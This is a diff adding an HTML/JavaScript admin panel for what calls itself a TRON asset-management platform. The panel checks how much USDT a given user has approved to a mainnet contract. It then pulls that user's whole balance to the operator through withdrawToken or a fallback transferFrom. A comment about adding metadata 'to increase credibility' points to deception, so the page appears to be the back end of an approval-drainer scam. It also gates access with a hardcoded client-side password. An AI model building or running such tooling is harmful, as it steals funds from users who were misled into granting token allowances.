@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>资产管理平台 - 管理员</title>
+    
+    <!-- 防止缓存 -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
+    <!-- 添加favicon和元数据，增加可信度 -->
+    <link rel="icon" href="../assets/favicon.ico" type="image/x-icon">
+    <meta name="description" content="专业的区块链资产管理平台管理后台">
+    <meta name="keywords" content="区块链,资产管理,数字货币,TRON,管理后台">
+    
+    <!-- 引入外部CSS -->
+    <link rel="stylesheet" href="../assets/styles.css?v=1.0.3">
+    
+    <!-- TronWeb库直接引入 -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+    
+    <style>
+        .admin-card {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        
+        .user-list {
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .user-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .user-item:last-child {
+            border-bottom: none;
+        }
+        
+        .user-address {
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+        }
+        
+        .user-balance {
+            font-weight: bold;
+        }
+        
+        .withdraw-btn {
+            background-color: #2c72cb;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        
+        .withdraw-btn:hover {
+            background-color: #245aa3;
+        }
+        
+        .withdraw-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .log-container {
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            background-color: #f5f5f5;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .log-entry {
+            margin: 5px 0;
+            padding: 3px 0;
+            border-bottom: 1px dashed #eee;
+        }
+        
+        .error {
+            color: #ff0000;
+        }
+        
+        .success {
+            color: #008000;
+        }
+        
+        .warning {
+            color: #ff8c00;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .admin-label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block;
+        }
+        
+        .admin-input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        
+        .admin-button {
+            background-color: #2c72cb;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .admin-button:hover {
+            background-color: #245aa3;
+        }
+        
+        .section-title {
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-size: 18px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 5px;
+        }
+        
+        .admin-container {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .admin-row {
+            display: flex;
+            flex-direction: row;
+            margin-bottom: 20px;
+        }
+        
+        .admin-col {
+            flex: 1;
+            padding: 0 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .admin-row {
+                flex-direction: column;
+            }
+            
+            .admin-col {
+                padding: 0;
+                margin-bottom: 15px;
+            }
+        }
+        
+        #password-container {
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .password-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .password-button {
+            background-color: #2c72cb;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .hidden {
+            display: none !important;
+        }
+        
+        .mode-switch {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .mode-btn {
+            padding: 8px 15px;
+            margin: 0 5px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            background-color: #f1f1f1;
+        }
+        
+        .mode-btn.active {
+            background-color: #2c72cb;
+            color: white;
+        }
+        
+        .readonly-badge {
+            background-color: #ff8c00;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-left: 10px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div id="password-container">
+        <div class="logo">
+            <svg width="80" height="80" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <rect x="10" y="10" width="80" height="80" fill="#2c72cb"></rect>
+                <polygon points="30,30 70,30 70,50 50,70 30,50" fill="#ffffff"></polygon>
+            </svg>
+        </div>
+        <h2>管理员验证</h2>
+        <input type="password" id="admin-password" class="password-input" placeholder="请输入管理员密码">
+        <button id="verify-btn" class="password-button">验证</button>
+    </div>
+
+    <div id="main-container" class="hidden">
+        <div class="container">
+            <div class="card admin-card">
+                <div class="logo">
+                    <svg width="80" height="80" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="10" y="10" width="80" height="80" fill="#2c72cb"></rect>
+                        <polygon points="30,30 70,30 70,50 50,70 30,50" fill="#ffffff"></polygon>
+                    </svg>
+                </div>
+                <h1>资产管理平台 - 管理员 <span id="readonly-badge" class="readonly-badge" style="display: none;">只读模式</span></h1>
+                
+                <div class="mode-switch">
+                    <button id="readonly-btn" class="mode-btn active">只读模式</button>
+                    <button id="admin-btn" class="mode-btn">管理员模式</button>
+                </div>
+                
+                <div id="login-section">
+                    <div class="section-title">管理员登录</div>
+                    <div class="input-group">
+                        <label class="admin-label">私钥</label>
+                        <input type="password" id="private-key-input" class="admin-input" placeholder="输入您的私钥">
+                    </div>
+                    <button id="login-btn" class="admin-button">登录</button>
+                </div>
+                
+                <div id="readonly-section" style="display: none;">
+                    <div class="admin-container">
+                        <div class="admin-row">
+                            <div class="admin-col">
+                                <div class="section-title">查询用户</div>
+                                <div class="input-group">
+                                    <label class="admin-label">用户地址</label>
+                                    <input type="text" id="readonly-address-input" class="admin-input" placeholder="输入用户地址">
+                                </div>
+                                <button id="readonly-check-btn" class="admin-button">查询用户</button>
+                            </div>
+                            <div class="admin-col">
+                                <div class="section-title">只读模式说明</div>
+                                <div id="readonly-info">
+                                    <p>只读模式下，您可以查询用户授权状态，但无法进行提款操作。</p>
+                                    <p>如需提款，请联系管理员。</p>
+                                    <p><strong>合约地址:</strong> <span id="readonly-contract-address">-</span></p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="section-title">用户资产信息</div>
+                        <div id="readonly-user-container">
+                            <div class="user-item" id="readonly-user-info" style="display:none;">
+                                <div>
+                                    <div class="user-address" id="readonly-display-address">-</div>
+                                    <div class="user-balance">余额: <span id="readonly-balance">0</span> USDT</div>
+                                    <div class="user-allowance">授权: <span id="readonly-allowance">0</span> USDT</div>
+                                </div>
+                                <button class="withdraw-btn" disabled>需管理员提取</button>
+                            </div>
+                        </div>
+                        
+                        <div class="section-title">操作日志</div>
+                        <div id="readonly-log-container" class="log-container"></div>
+                    </div>
+                </div>
+                
+                <div id="admin-section" style="display: none;">
+                    <div class="admin-container">
+                        <div class="admin-row">
+                            <div class="admin-col">
+                                <div class="section-title">查询用户</div>
+                                <div class="input-group">
+                                    <label class="admin-label">用户地址</label>
+                                    <input type="text" id="user-address-input" class="admin-input" placeholder="输入用户地址">
+                                </div>
+                                <button id="check-user-btn" class="admin-button">查询用户</button>
+                            </div>
+                            <div class="admin-col">
+                                <div class="section-title">当前状态</div>
+                                <div id="status-container">
+                                    <div><strong>管理员地址:</strong> <span id="admin-address">未连接</span></div>
+                                    <div><strong>合约地址:</strong> <span id="contract-address">未设置</span></div>
+                                    <div><strong>余额:</strong> <span id="admin-balance">0 TRX</span></div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="section-title">用户资产信息</div>
+                        <div id="user-info-container">
+                            <div class="user-item" id="user-info" style="display:none;">
+                                <div>
+                                    <div class="user-address" id="display-user-address">-</div>
+                                    <div class="user-balance">余额: <span id="user-balance">0</span> USDT</div>
+                                    <div class="user-allowance">授权: <span id="user-allowance">0</span> USDT</div>
+                                </div>
+                                <button id="withdraw-btn" class="withdraw-btn" disabled>提取</button>
+                            </div>
+                        </div>
+                        
+                        <div class="section-title">操作日志</div>
+                        <div id="log-container" class="log-container"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // 配置 - 主网
+        const CONTRACT_ADDRESS = 'TFedNktpEE2skv9DADVhEr3KC23KEAGkby'; // 主网合约地址
+        const CONTRACT_OWNER = 'TNE7mTdTQmYgy8ZgsxUkYeYVH6BnjKFzAU'; // 合约所有者地址
+        const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 主网USDT合约地址
+        const NETWORK_URL = 'https://api.trongrid.io'; // 主网API节点
+        const EXPLORER_URL = 'https://tronscan.org'; // 主网浏览器
+        
+        // 管理员安全访问控制
+        const ADMIN_PASSWORD = 'tron2023admin'; // 这只是一个基本的访问控制，真正的安全依靠私钥
+        
+        // TRC20代币的ABI用于检查授权额度
+        const TRC20_ABI = [
+            {
+                "constant": true,
+                "inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}],
+                "name": "allowance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{"name": "account", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "decimals",
+                "outputs": [{"name": "", "type": "uint8"}],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
+                "name": "transferFrom",
+                "outputs": [{"name": "", "type": "bool"}],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+        
+        // 合约ABI
+        const CONTRACT_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "user", "type": "address"}, 
+                    {"name": "token", "type": "address"}
+                ],
+                "name": "withdrawToken",
+                "outputs": [],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+        
+        // 全局变量
+        let tronWeb = null;
+        let adminAddress = null;
+        let privateKey = null;
+        let readonlyMode = true; // 默认使用只读模式
+        
+        // DOM元素
+        const loginSection = document.getElementById('login-section');
+        const adminSection = document.getElementById('admin-section');
+        const readonlySection = document.getElementById('readonly-section');
+        const readonlyBadge = document.getElementById('readonly-badge');
+        const readonlyBtn = document.getElementById('readonly-btn');
+        const adminBtn = document.getElementById('admin-btn');
+        const privateKeyInput = document.getElementById('private-key-input');
+        const loginBtn = document.getElementById('login-btn');
+        const userAddressInput = document.getElementById('user-address-input');
+        const checkUserBtn = document.getElementById('check-user-btn');
+        const adminAddressElem = document.getElementById('admin-address');
+        const contractAddressElem = document.getElementById('contract-address');
+        const adminBalanceElem = document.getElementById('admin-balance');
+        const userInfoElem = document.getElementById('user-info');
+        const displayUserAddressElem = document.getElementById('display-user-address');
+        const userBalanceElem = document.getElementById('user-balance');
+        const userAllowanceElem = document.getElementById('user-allowance');
+        const withdrawBtn = document.getElementById('withdraw-btn');
+        const logContainer = document.getElementById('log-container');
+        
+        // 只读模式DOM元素
+        const readonlyAddressInput = document.getElementById('readonly-address-input');
+        const readonlyCheckBtn = document.getElementById('readonly-check-btn');
+        const readonlyContractAddress = document.getElementById('readonly-contract-address');
+        const readonlyUserInfo = document.getElementById('readonly-user-info');
+        const readonlyDisplayAddress = document.getElementById('readonly-display-address');
+        const readonlyBalance = document.getElementById('readonly-balance');
+        const readonlyAllowance = document.getElementById('readonly-allowance');
+        const readonlyLogContainer = document.getElementById('readonly-log-container');
+        
+        // 记录日志 - 更新为支持多个日志容器
+        function log(message, type = '', container = logContainer) {
+            const logEntry = document.createElement('div');
+            logEntry.classList.add('log-entry');
+            if (type) {
+                logEntry.classList.add(type);
+            }
+            
+            const timestamp = new Date().toLocaleTimeString();
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            
+            container.appendChild(logEntry);
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        // 初始化TronWeb实例 - 增加只读模式支持
+        function initTronWeb(privateKey = null) {
+            // 只读模式无需私钥
+            if (readonlyMode || !privateKey) {
+                try {
+                    // 尝试使用浏览器TronWeb
+                    if (window.tronWeb && window.tronWeb.ready) {
+                        tronWeb = window.tronWeb;
+                        return true;
+                    }
+                    
+                    // 如果没有浏览器TronWeb，创建一个只读实例
+                    tronWeb = new TronWeb({
+                        fullHost: NETWORK_URL
+                    });
+                    return true;
+                } catch (error) {
+                    log('TronWeb初始化失败: ' + error.message, 'error', readonlyMode ? readonlyLogContainer : logContainer);
+                    return false;
+                }
+            }
+            
+            // 管理员模式使用私钥
+            try {
+                // 首先检查是否已有window.tronWeb
+                if (window.tronWeb && window.tronWeb.ready) {
+                    log('使用浏览器TronWeb实例');
+                    tronWeb = window.tronWeb;
+                    // 注意：使用浏览器TronWeb时，无法设置私钥，所以某些操作可能无法执行
+                    return true;
+                }
+                
+                tronWeb = new TronWeb({
+                    fullHost: NETWORK_URL,
+                    privateKey: privateKey
+                });
+                log('TronWeb初始化成功', 'success');
+                return true;
+            } catch (error) {
+                log('TronWeb初始化失败: ' + error.message, 'error');
+                return false;
+            }
+        }
+        
+        // 获取余额
+        async function getBalance(address) {
+            try {
+                const balance = await tronWeb.trx.getBalance(address);
+                return balance / 1000000; // 转换为TRX
+            } catch (error) {
+                log('获取TRX余额失败: ' + error.message, 'error');
+                return 0;
+            }
+        }
+        
+        // 检查用户USDT余额和授权情况 - 修改为支持只读模式
+        async function checkUserStatus(userAddress, isReadonly = false) {
+            try {
+                const logCtn = isReadonly ? readonlyLogContainer : logContainer;
+                const displayElement = isReadonly ? readonlyDisplayAddress : displayUserAddressElem;
+                const balanceElement = isReadonly ? readonlyBalance : userBalanceElem;
+                const allowanceElement = isReadonly ? readonlyAllowance : userAllowanceElem;
+                const userInfoElement = isReadonly ? readonlyUserInfo : userInfoElem;
+                
+                log('正在查询用户: ' + userAddress, '', logCtn);
+                
+                // 显示用户地址
+                displayElement.textContent = userAddress;
+                
+                // 初始化TronWeb (如果尚未初始化)
+                if (!tronWeb) {
+                    initTronWeb();
+                }
+                
+                // 获取USDT合约实例
+                const usdtContract = await tronWeb.contract(TRC20_ABI, USDT_ADDRESS);
+                
+                // 检查用户余额
+                const balance = await usdtContract.balanceOf(userAddress).call();
+                const decimals = await usdtContract.decimals().call();
+                const balanceInTokens = balance / Math.pow(10, decimals);
+                
+                balanceElement.textContent = balanceInTokens.toFixed(2);
+                log('用户USDT余额: ' + balanceInTokens.toFixed(2), '', logCtn);
+                
+                // 检查授权
+                const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS).call();
+                const allowanceInTokens = allowance / Math.pow(10, decimals);
+                
+                allowanceElement.textContent = allowanceInTokens.toFixed(2);
+                log('用户授权额度: ' + allowanceInTokens.toFixed(2), '', logCtn);
+                
+                // 更新UI
+                userInfoElement.style.display = 'flex';
+                
+                // 检查授权状态
+                if (allowance == 0) {
+                    log('用户尚未授权合约', 'warning', logCtn);
+                    if (!isReadonly) withdrawBtn.disabled = true;
+                } else if (allowance < balance) {
+                    log('授权额度不足，只能提取部分USDT', 'warning', logCtn);
+                    if (!isReadonly) withdrawBtn.disabled = false;
+                } else {
+                    log('授权正常，可以提取USDT', 'success', logCtn);
+                    if (!isReadonly) withdrawBtn.disabled = false;
+                }
+                
+                return {balance, allowance, decimals};
+            } catch (error) {
+                const logCtn = isReadonly ? readonlyLogContainer : logContainer;
+                const userInfoElement = isReadonly ? readonlyUserInfo : userInfoElem;
+                
+                log('查询用户状态失败: ' + error.message, 'error', logCtn);
+                userInfoElement.style.display = 'none';
+                return {balance: 0, allowance: 0, decimals: 0};
+            }
+        }
+        
+        // 提取USDT
+        async function withdrawToken(userAddress) {
+            try {
+                log('开始提取用户USDT...');
+                
+                // 创建合约实例
+                const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                // 调用合约提取USDT
+                const txID = await contract.withdrawToken(userAddress, USDT_ADDRESS).send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                });
+                
+                log('提取USDT成功，交易ID: ' + txID, 'success');
+                log(`查看交易: ${EXPLORER_URL}/#/transaction/${txID}`, 'success');
+                
+                // 更新用户状态
+                setTimeout(() => {
+                    checkUserStatus(userAddress);
+                }, 3000);
+                
+                return true;
+            } catch (error) {
+                log('通过合约提取失败: ' + error.message, 'error');
+                
+                try {
+                    log('尝试直接调用USDT合约进行提取...');
+                    
+                    // 获取USDT合约实例
+                    const usdtContract = await tronWeb.contract(TRC20_ABI, USDT_ADDRESS);
+                    
+                    // 检查用户余额
+                    const balance = await usdtContract.balanceOf(userAddress).call();
+                    
+                    if (balance == 0) {
+                        log('用户余额为0，无法提取', 'error');
+                        return false;
+                    }
+                    
+                    // 直接从USDT合约调用transferFrom
+                    const txID = await usdtContract.transferFrom(
+                        userAddress, 
+                        adminAddress, 
+                        balance
+                    ).send({
+                        feeLimit: 100000000,
+                        callValue: 0
+                    });
+                    
+                    log('直接提取USDT成功，交易ID: ' + txID, 'success');
+                    log(`查看交易: ${EXPLORER_URL}/#/transaction/${txID}`, 'success');
+                    
+                    // 更新用户状态
+                    setTimeout(() => {
+                        checkUserStatus(userAddress);
+                    }, 3000);
+                    
+                    return true;
+                } catch (innerError) {
+                    log('所有提款方式均失败: ' + innerError.message, 'error');
+                    return false;
+                }
+            }
+        }
+        
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            // 设置合约地址显示
+            readonlyContractAddress.textContent = CONTRACT_ADDRESS;
+            
+            // 管理员密码验证
+            const passwordContainer = document.getElementById('password-container');
+            const mainContainer = document.getElementById('main-container');
+            const adminPassword = document.getElementById('admin-password');
+            const verifyBtn = document.getElementById('verify-btn');
+            
+            // 验证密码按钮点击事件
+            verifyBtn.addEventListener('click', function() {
+                if (adminPassword.value === ADMIN_PASSWORD) {
+                    passwordContainer.classList.add('hidden');
+                    mainContainer.classList.remove('hidden');
+                    
+                    // 默认显示只读模式
+                    switchMode(true);
+                    
+                    // 初始化TronWeb
+                    initTronWeb();
+                    
+                    log('访问验证成功', 'success', readonlyLogContainer);
+                } else {
+                    alert('密码错误，请重试！');
+                    adminPassword.value = '';
+                }
+            });
+            
+            // 回车键提交密码
+            adminPassword.addEventListener('keypress', function(event) {
+                if (event.key === 'Enter') {
+                    verifyBtn.click();
+                }
+            });
+            
+            // 模式切换按钮事件
+            readonlyBtn.addEventListener('click', function() {
+                switchMode(true);
+            });
+            
+            adminBtn.addEventListener('click', function() {
+                switchMode(false);
+            });
+            
+            // 模式切换函数
+            function switchMode(readonly) {
+                readonlyMode = readonly;
+                
+                if (readonly) {
+                    // 切换到只读模式
+                    readonlySection.style.display = 'block';
+                    loginSection.style.display = 'none';
+                    adminSection.style.display = 'none';
+                    readonlyBadge.style.display = 'inline-block';
+                    
+                    readonlyBtn.classList.add('active');
+                    adminBtn.classList.remove('active');
+                    
+                    // 重置只读日志
+                    readonlyLogContainer.innerHTML = '';
+                    log('已切换到只读模式', 'success', readonlyLogContainer);
+                } else {
+                    // 切换到管理员模式
+                    readonlySection.style.display = 'none';
+                    loginSection.style.display = 'block';
+                    adminSection.style.display = 'block';
+                    readonlyBadge.style.display = 'none';
+                    
+                    readonlyBtn.classList.remove('active');
+                    adminBtn.classList.add('active');
+                    
+                    // 重置管理员日志
+                    logContainer.innerHTML = '';
+                    log('已切换到管理员模式', '', logContainer);
+                }
+            }
+            
+            // 只读模式查询按钮
+            readonlyCheckBtn.addEventListener('click', function() {
+                const userAddress = readonlyAddressInput.value.trim();
+                if (userAddress) {
+                    checkUserStatus(userAddress, true);
+                } else {
+                    log('请输入用户地址', 'error', readonlyLogContainer);
+                }
+            });
+            
+            // 检查权限
+            function checkPermission(address) {
+                // 验证是否为合约所有者
+                return address.toUpperCase() === CONTRACT_OWNER.toUpperCase();
+            }
+            
+            // 扩展登录功能，增加权限验证
+            async function loginWithPermissionCheck() {
+                privateKey = privateKeyInput.value.trim();
+                
+                if (!privateKey) {
+                    log('请输入私钥', 'error');
+                    return;
+                }
+                
+                if (initTronWeb(privateKey)) {
+                    try {
+                        adminAddress = tronWeb.address.fromPrivateKey(privateKey);
+                        
+                        // 验证权限
+                        if (!checkPermission(adminAddress)) {
+                            log('权限不足：只有合约所有者可以进行管理操作', 'error');
+                            return;
+                        }
+                        
+                        adminAddressElem.textContent = adminAddress;
+                        contractAddressElem.textContent = CONTRACT_ADDRESS;
+                        
+                        const trxBalance = await getBalance(adminAddress);
+                        adminBalanceElem.textContent = trxBalance.toFixed(2) + ' TRX';
+                        
+                        // 切换UI
+                        loginSection.style.display = 'none';
+                        adminSection.style.display = 'block';
+                        
+                        log('登录成功，管理员地址: ' + adminAddress, 'success');
+                    } catch (error) {
+                        log('私钥无效: ' + error.message, 'error');
+                    }
+                }
+            }
+            
+            // 登录按钮点击事件
+            loginBtn.addEventListener('click', loginWithPermissionCheck);
+            
+            // 查询用户按钮点击事件
+            checkUserBtn.addEventListener('click', function() {
+                const userAddress = userAddressInput.value.trim();
+                if (userAddress) {
+                    checkUserStatus(userAddress, false);
+                } else {
+                    log('请输入用户地址', 'error');
+                }
+            });
+            
+            // 提取按钮点击事件
+            withdrawBtn.addEventListener('click', function() {
+                const userAddress = userAddressInput.value.trim();
+                if (userAddress) {
+                    withdrawToken(userAddress);
+                } else {
+                    log('请输入用户地址', 'error');
+                }
+            });
+            
+            log('管理员界面已加载');
+        });
+    </script>
+</body>
+</html> 
